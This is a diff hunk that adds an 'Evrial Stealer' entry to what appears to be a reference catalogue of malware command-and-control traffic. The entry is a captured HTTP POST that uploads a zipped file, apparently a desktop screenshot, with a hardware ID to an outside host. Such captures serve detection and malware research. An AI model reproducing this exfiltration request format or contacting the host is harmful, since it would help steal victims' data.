@@ -767,6 +767,27 @@ I6.$...Z,....
 ~~~
 ![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evilpony.png "Evilpony")
 
+#### Evrial Stealer
+~~~
+HTTP/1.1 100 Continue
+
+POST /files/upload.php?user=XakFor.Net&hwid=EEEB5D54788042A7B542739BBC26CF4B HTTP/1.1
+Content-Type: multipart/form-data; boundary=---------------------8d7830f073b0ab4
+Host: softfare.zzz.com.ua
+Content-Length: 58292
+Expect: 100-continue
+Connection: Keep-Alive
+
+-----------------------8d7830f073b0ab4
+Content-Disposition: form-data; name="file"; filename="sega2laj1y4.zip"
+Content-Type: application/octet-stream
+
+PK........W..O........M.......desktop.jpg..u\T].=:.4b. ....t."14CI..AH..H( #9t#0.. ) 
+.!.J7.
+...}.}.....?.....9s....a?.Y.z.yO..L...*!.`xxx.{.?..(L.FBDDLt.................
+~~~
+![alt text](https://github.com/silence-is-best/c2db/blob/master/images/evrial.png "Evrial")
+
 #### Exilerat
 ~~~
 POST /test/u HTTP/1.1
